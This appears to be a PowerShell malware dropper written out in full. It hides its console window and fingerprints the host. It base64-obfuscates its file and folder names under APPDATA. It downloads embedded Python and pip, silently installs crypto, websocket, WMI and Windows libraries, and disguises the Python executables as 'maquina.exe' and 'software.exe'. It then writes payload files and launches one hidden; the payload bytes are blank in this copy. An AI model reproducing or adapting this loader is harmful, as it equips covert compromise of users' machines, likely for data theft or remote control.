# echo "Powershell $($host.Version.Major)" > ps.log
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

$sr = $env:USERNAME
$pc = $env:COMPUTERNAME
$id = (Get-WmiObject Win32_OperatingSystem).InstallDate
$id = "$sr-$pc-$id"

$id = [System.BitConverter]::ToString(([System.Security.Cryptography.HashAlgorithm]::Create('sha256')).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($id))).Replace('-', '').ToLower()

$h = "$env:TEMP\$id"
$th = Test-Path -Path "$h" -PathType Leaf

if ( $th ) { exit }

$t = [System.IO.Path]::GetTempFileName()
$z = [System.IO.Path]::ChangeExtension($t, ".zip")

Move-Item "$t" "$z"

$u = "https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-win32.zip"
$p = "https://bootstrap.pypa.io/get-pip.py"

$e = "RGVudGlzdGEgZGUgT3DDp8O1ZXM="
$e = [System.Convert]::FromBase64String($e)
$e = [System.Text.Encoding]::UTF8.GetString($e)
$e = "$env:APPDATA\$e"

$n = [System.Convert]::FromBase64String("ZGFkb3MuYmlu")
$n = [System.Text.Encoding]::UTF8.GetString($n)

$d = [System.Convert]::FromBase64String("Y29uZmln")
$d = [System.Text.Encoding]::UTF8.GetString($d)

$x = "$e\$d"

$f = [System.Convert]::FromBase64String("b3B0aW9ucy5kYXQ=")
$f = [System.Text.Encoding]::UTF8.GetString($f)

$b = [System.Convert]::FromBase64String("c2V0dGluZ3MuYmlu")
$b = [System.Text.Encoding]::UTF8.GetString($b)

$g = [System.Convert]::FromBase64String("ZGF0YWJhc2UuZGF0")
$g = [System.Text.Encoding]::UTF8.GetString($g)

$pc = [System.Convert]::FromBase64String("bWFxdWluYS5leGU=")
$pc = [System.Text.Encoding]::UTF8.GetString($pc)

$pw = [System.Convert]::FromBase64String("c29mdHdhcmUuZXhl")
$pw = [System.Text.Encoding]::UTF8.GetString($pw)

$i = ""
$i = [System.Convert]::FromBase64String($i)

$c = ""
$c = [System.Convert]::FromBase64String($c)

$r = ""
$r = [System.Convert]::FromBase64String($r)

# echo "Url: `"$u`"" >> ps.log

[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, ssl3"
Invoke-WebRequest -uri "$u" -outfile "$z"

# echo "Download completed `"$z`"" >> ps.log
# echo "Extracting files" >> ps.log

New-Item "$x" -ItemType Directory

Expand-Archive -force -LiteralPath "$z" -DestinationPath "$x"

# echo "Files extracted to `"$x`"" >> ps.log

rm "$z"

# echo "File `"$z`" deleted" >> ps.log

#rm "$x\*._pth"
Add-Content -Path "$x\python312._pth" -Value "import site" -Encoding utf8

# echo "File `"$x\*._pth`" deleted" >> ps.log

# echo "Copying python executable files" >> ps.log

cp "$x\python.exe" "$x\$pc"
cp "$x\pythonw.exe" "$x\$pw"

# echo "Python executable files copied" >> ps.log

# echo "Downloading pip from `"$p`"" >> ps.log

Invoke-WebRequest -uri "$p" -outfile "$x\$g"

Start-Process -FilePath "$x\$pc" -ArgumentList "$g" -WorkingDirectory "$x" -WindowStyle hidden -Wait
Start-Process -FilePath "$x\$pc" -ArgumentList "-m pip install pycryptodome==3.17 requests==2.28.2 pywin32==306 websocket-client==1.5.1 wmi==1.5.1" -WorkingDirectory "$x" -WindowStyle hidden -Wait

# echo "pip installed" >> ps.log

[IO.File]::WriteAllBytes("$e\$f", $i)
[IO.File]::WriteAllBytes("$e\$b", $r)
[IO.File]::WriteAllBytes("$e\$n", $c)

Start-Process -FilePath "$x\$pc" -ArgumentList "$b" -WorkingDirectory "$e" -WindowStyle hidden

New-Item -Path "$env:TEMP" -Name "$id" -ItemType File

exit
